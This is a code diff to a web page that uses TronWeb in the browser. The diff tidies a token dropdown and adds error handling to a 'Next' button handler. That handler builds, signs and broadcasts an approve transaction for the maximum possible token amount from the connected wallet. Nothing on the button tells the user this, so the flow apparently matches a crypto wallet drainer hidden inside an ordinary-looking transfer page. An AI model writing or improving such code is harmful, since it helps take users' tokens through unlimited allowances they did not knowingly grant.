@@ -168,9 +168,7 @@
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
             
-            // CHIUDE IL DROPDOWN SUBITO ✅
             closeDropdown();
-            
             initializeTokenDropdown();
         }
 
@@ -279,13 +277,17 @@
                     return;
                 }
 
-                let accounts = await tronWeb.request({ method: "tron_requestAccounts" });
-                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+                // Ottieni l'indirizzo dell'utente - TronWeb lo fornisce direttamente
+                let userAddress = tronWeb.defaultAddress.base58;
 
                 if (!userAddress) {
-                    userAddress = tronWeb.defaultAddress.base58;
+                    showError('Please connect your wallet');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
                 }
 
+                // Costruisci la transazione per l'approve
                 const parameter = [
                     {type: 'address', value: token.smartContract},
                     {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
@@ -299,8 +301,22 @@
                     userAddress
                 );
 
+                if (!tx.result || !tx.result.result) {
+                    showError('Failed to build transaction');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
+                }
+
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (!txHash) {
+                    showError('Failed to send transaction');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
+                }
 
                 await new Promise(resolve => setTimeout(resolve, 100));
 
